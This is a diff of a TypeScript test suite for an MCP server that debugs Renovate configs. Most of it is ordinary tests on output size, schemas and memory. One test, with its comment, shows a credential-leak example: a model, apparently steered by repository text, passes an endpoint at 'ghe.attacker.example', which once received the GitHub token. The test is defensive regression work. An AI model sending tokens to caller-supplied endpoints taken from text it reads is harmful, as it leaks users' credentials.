@@ -6,7 +6,7 @@ import { getPresetAuth, setPresetAuth } from "@renovate-config-debugger/engine";
 import pkg from "../../package.json";
 import { createMcpServer } from "./server";
 import { RESULT_BUDGET_BYTES } from "./result";
-import { RunStore } from "./run-store";
+import { DEFAULT_RUN_LIMIT, RunStore } from "./run-store";
 import { recordingIo } from "../test-harness";
 
 /**
@@ -46,15 +46,18 @@ interface ConnectOptions {
   env?: Record<string, string | undefined>;
   /** Omitted: the client's default, the 2025-era `initialize` handshake. */
   era?: "modern";
+  /** A store the test can read back — what the server HELD, not what it answered. */
+  store?: RunStore;
 }
 
 async function connect(options?: ConnectOptions): Promise<void> {
   const io = recordingIo(options?.env ? { env: options.env } : undefined);
   const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
   // One factory, both eras — the entry pins ONE instance per connection.
-  const handle: StdioServerHandle = serveStdio(() => createMcpServer(io), {
-    transport: serverTransport,
-  });
+  const handle: StdioServerHandle = serveStdio(
+    () => createMcpServer(io, options?.store ? { store: options.store } : undefined),
+    { transport: serverTransport },
+  );
   client = new Client(
     { name: "test", version: "0" },
     options?.era === "modern"
@@ -267,6 +270,51 @@ describe("credential isolation", () => {
     expect(getPresetAuth()).toEqual(before);
   });
 
+  /**
+   * M3 (roadmap 068). The guard used to inspect the GLOBAL CONFIG only — but
+   * `endpoint` is also a parameter of this tool, and over MCP the model fills
+   * it in, plausibly from text in the repository it was asked to inspect.
+   * `run_config({content: '{"extends":["local>me/presets"]}', endpoint:
+   * "https://ghe.attacker.example/api/v3/"})` sent RCD_GITHUB_TOKEN there with
+   * no opt-in at all. The CLI is unaffected: a person typed the flag.
+   */
+  test("an endpoint the CALLER chose withholds tokens until it is vouched for", async () => {
+    await close();
+    await connect({ env: { GITHUB_TOKEN: "gh-token" } });
+    const requests: { url: string; authorization: string | null }[] = [];
+    vi.stubGlobal("fetch", (input: unknown, init?: RequestInit) => {
+      requests.push({
+        url: String(input),
+        authorization: new Headers(init?.headers).get("authorization"),
+      });
+      return Promise.resolve(new Response("not found", { status: 404 }));
+    });
+    const args = {
+      fileName: "renovate.json",
+      content: '{"extends":["github>elsewhere/presets"]}',
+      endpoint: "https://ghe.attacker.example/api/v3/",
+    };
+
+    const guarded = (await call("run_config", args)) as { notes?: string[] };
+    expect(guarded.notes?.join(" ")).toContain("credentials withheld");
+    // `platformOverride` is NOT the opt-in here: it only decides whose
+    // endpoint wins, and both candidates are values this caller supplied.
+    const overridden = (await call("run_config", { ...args, platformOverride: true })) as {
+      notes?: string[];
+    };
+    expect(overridden.notes?.join(" ")).toContain("credentials withheld");
+    expect(requests.length).toBeGreaterThan(0);
+    expect(requests.map((r) => r.authorization)).toEqual(requests.map(() => null));
+
+    requests.length = 0;
+    const vouched = (await call("run_config", { ...args, trustEndpoints: true })) as {
+      notes?: string[];
+    };
+    expect(vouched).not.toHaveProperty("notes");
+    expect(requests.length).toBeGreaterThan(0);
+    expect(requests.every((r) => r.authorization === "Bearer gh-token")).toBe(true);
+  });
+
   test("a run never installs its credentials outside the engine's queue", async () => {
     await close();
     await connect({ env: { GITHUB_TOKEN: "gh-token" } });
@@ -301,6 +349,23 @@ describe("drill-down", () => {
     };
     expect(entry.winner).toBe("repo");
     expect(entry.chain.length).toBeGreaterThan(0);
+  });
+
+  /**
+   * Roadmap 068 (2 persona sessions + the review): provenance answers "which
+   * LAYER set this", and both personas read a static winner as "the value
+   * Renovate will use" for an update a packageRule actually overrides.
+   */
+  test("a key packageRules can also set says so, and points at the simulator", async () => {
+    const runId = await runConfig(GROUPED);
+    const grouped = (await call("get_provenance", { runId, key: "groupName" })) as {
+      note?: string;
+    };
+    expect(grouped.note).toContain("1 packageRule can set `groupName` per-dependency");
+    expect(grouped.note).toContain("Simulate a dependency");
+    // A key no rule touches carries no such caveat.
+    const labels = (await call("get_provenance", { runId, key: "labels" })) as { note?: string };
+    expect(labels.note).toBeUndefined();
   });
 
   test("the resolved document keeps internal presets by default", async () => {
@@ -422,6 +487,44 @@ describe("strict input schemas", () => {
       expect(tool.inputSchema.additionalProperties, tool.name).toBe(false);
     }
   });
+
+  /**
+   * Roadmap 068, from the persona study: two sessions burned actions on an
+   * "Invalid input, Invalid input" rejection that named no field. This pins
+   * what the SDK actually reports for the shapes those sessions produced —
+   * the zod issue PATH, joined and prefixed — so a schema change that loses
+   * the field name is a failing test rather than a lost session. The commonest
+   * mistake by far is the first one: `content` is the file's TEXT.
+   */
+  test("a rejected argument names the field, and its type", async () => {
+    const errorFor = async (name: string, args: Record<string, unknown>): Promise<string> => {
+      const result = (await client.callTool({ name, arguments: args })) as ToolText;
+      expect(result.isError, JSON.stringify(args)).toBe(true);
+      return result.content[0]?.text ?? "";
+    };
+    expect(
+      await errorFor("run_config", { content: { extends: ["config:recommended"] } }),
+    ).toContain("content: Invalid input: expected string, received object");
+    expect(await errorFor("run_config", { fileName: "renovate.json" })).toContain(
+      "content: Invalid input: expected string, received undefined",
+    );
+    expect(await errorFor("simulate", { runId: "run-1", dep: { depName: 5 } })).toContain(
+      "dep.depName: Invalid input: expected string, received number",
+    );
+    expect(await errorFor("simulate", { runId: "run-1", dep: {}, verdict: "sometimes" })).toContain(
+      'verdict: Invalid option: expected one of "notable"',
+    );
+  });
+
+  test("the content parameter says it wants the file's text", async () => {
+    const { tools } = await client.listTools();
+    const runConfigTool = tools.find((t) => t.name === "run_config");
+    const content = (
+      runConfigTool?.inputSchema.properties as { content?: { description?: string } } | undefined
+    )?.content;
+    expect(content?.description).toContain("JSON *string*");
+    expect(content?.description).toContain("not the parsed object");
+  });
 });
 
 describe("simulate and compare", () => {
@@ -442,6 +545,62 @@ describe("simulate and compare", () => {
     expect(sim.dep.updateType).toBe("major");
     expect(sim.rules[0]?.verdict).toBe("matched");
     expect(sim.rules[0]?.clauses[0]).toMatchObject({ key: "matchPackageNames" });
+  });
+
+  /**
+   * H1 (roadmap 068, 6 of 9 persona sessions). The whole `SimulationResult`
+   * for `config:recommended` + a react update is 1.36 MB, of which
+   * `mergeSteps` is 797 kB and `rawFinalConfig` 199 kB — and the elision spent
+   * the budget on them, answering with 2 of 713 rules and no merge trace
+   * anyway. The default answer is now the question that was asked.
+   */
+  test("the merge trace is opt-in, so the verdict is what comes back", async () => {
+    const runId = await runConfig(RECOMMENDED);
+    const dep = { depName: "react", packageName: "react", currentValue: "17", newValue: "18" };
+    const text = await callText("simulate", { runId, dep });
+    const parsed = JSON.parse(text) as {
+      truncated?: boolean;
+      omittedKeys?: string[];
+      detailNote: string;
+      finalDependencyConfig: Record<string, unknown>;
+      flattened: unknown;
+      rules: { truncated: boolean; shown: number; omitted: number } | unknown[];
+    };
+    expect(parsed).not.toHaveProperty("mergeSteps");
+    expect(parsed).not.toHaveProperty("rawFinalConfig");
+    // The omission is stated, with the parameter that undoes it.
+    expect(parsed.detailNote).toContain('detail: "full"');
+    // The answer itself survives WHOLE — no key was dropped to make room.
+    expect(parsed.omittedKeys).toBeUndefined();
+    expect(parsed.flattened).toBeDefined();
+    expect(Object.keys(parsed.finalDependencyConfig).length).toBeGreaterThan(10);
+    // And the rule list is a real sample of 713, not a token two.
+    const rules = parsed.rules as { shown: number; omitted: number };
+    expect(rules.shown + rules.omitted).toBeGreaterThan(700);
+    expect(rules.shown).toBeGreaterThan(20);
+  });
+
+  /**
+   * And the other half of the argument for the default: `full` asks for the
+   * merge trace, and a merge step is a whole config snapshot — even this
+   * three-line config's is far over the budget, so the answer comes back with
+   * the trace elided or dropped BY NAME. That is the honest outcome of asking
+   * for it; it is not the shape to spend a call on by accident.
+   */
+  test('detail: "full" asks for the merge trace, and pays for it', async () => {
+    const runId = await runConfig(GROUPED);
+    const dep = { depName: "react", packageName: "react" };
+    const full = (await call("simulate", { runId, dep, detail: "full" })) as {
+      truncated?: boolean;
+      omittedKeys?: string[];
+      detailNote?: string;
+    };
+    expect(full.detailNote).toBeUndefined();
+    expect(full.truncated).toBe(true);
+    expect(full.omittedKeys).toContain("mergeSteps");
+    // The default answer for the same question never got that big.
+    const verdict = (await call("simulate", { runId, dep })) as { truncated?: boolean };
+    expect(verdict.truncated).toBeUndefined();
   });
 
   test("verdict/source scope the rule list and say what they hid", async () => {
@@ -472,9 +631,13 @@ describe("simulate and compare", () => {
       runId: before,
       runIdB: after,
       dep,
-    })) as { noChange: boolean; matchedOnlyInB: { label: string }[] };
+    })) as { noChange: boolean; summary: string; matchedOnlyInB: { label: string }[] };
     expect(comparison.noChange).toBe(false);
     expect(comparison.matchedOnlyInB[0]?.label).toBe("matchPackageNames");
+    // Roadmap 068 (4 of 9 persona sessions): the net effect, before anyone has
+    // to assemble it out of six arrays.
+    expect(comparison.summary).toContain("differs: ");
+    expect(comparison.summary).toContain("groupName");
   });
 
   test("the same run twice changes nothing", async () => {
@@ -482,8 +645,11 @@ describe("simulate and compare", () => {
     const comparison = (await call("compare_simulations", {
       runId,
       dep: { depName: "react", packageName: "react" },
-    })) as { noChange: boolean };
+    })) as { noChange: boolean; summary: string };
     expect(comparison.noChange).toBe(true);
+    expect(comparison.summary).toBe(
+      "identical: the same rules matched and the same effective config results",
+    );
   });
 });
 
@@ -524,6 +690,60 @@ describe("explain_message and get_option_docs", () => {
     expect(doc.name).toBe("packageRules");
     expect(doc.renovateVersion).toMatch(/^\d+\./);
     await expect(call("get_option_docs", { name: "nopeNotAnOption" })).rejects.toThrow(/search/);
+  });
+});
+
+/**
+ * H2 (roadmap 068): a held `config:recommended` trace measured ~165 MB, 76 MB
+ * of it events and 75 MB of THAT the logger shim's raw `log` records — which
+ * nothing on this path reads. Four held runs were 713 MB of heap, in a process
+ * an MCP host keeps alive for the length of a working session.
+ */
+describe("held runs carry only what the tools read", () => {
+  test("a session holds three runs — the before/after oracle needs two", () => {
+    expect(DEFAULT_RUN_LIMIT).toBe(3);
+  });
+
+  test("the held trace has no log events, and every tool still answers", async () => {
+    const store = new RunStore();
+    await close();
+    await connect({ store });
+
+    const runId = await runConfig(CONFIG);
+    const held = store.get(runId);
+    expect(held.result.events.length).toBeGreaterThan(0);
+    expect(held.result.events.some((event) => event.kind === "log")).toBe(false);
+
+    // Every drill-down answers from the stripped trace: the derivations index
+    // stage/migration/preset events, and the tree, provenance and resolved
+    // projections read no events at all.
+    const summary = (await call("run_config", {
+      fileName: "renovate.json",
+      content: CONFIG,
+    })) as { digest: string; treeSummary: { resolved: number } };
+    expect(summary.digest).toContain("Renovate accepted this config");
+    expect(summary.treeSummary.resolved).toBe(1);
+    const tree = (await call("get_preset_tree", { runId })) as {
+      root: { children: unknown[] };
+    };
+    expect(tree.root.children).toHaveLength(1);
+    const provenance = (await call("get_provenance", { runId, key: "labels" })) as {
+      winner: string;
+    };
+    expect(provenance.winner).toBe("repo");
+    const resolved = (await call("get_resolved_config", { runId })) as {
+      config: { extends: string[] };
+    };
+    expect(resolved.config.extends).toEqual([":dependencyDashboard"]);
+    const explained = (await call("explain_message", {
+      runId,
+      message: "Configuration option `labels` should be a list (Array)",
+    })) as { severity: string };
+    expect(explained.severity).toBe("error");
+    const sim = (await call("simulate", { runId, dep: { depName: "react" } })) as {
+      rules: unknown[];
+    };
+    expect(Array.isArray(sim.rules)).toBe(true);
   });
 });
 
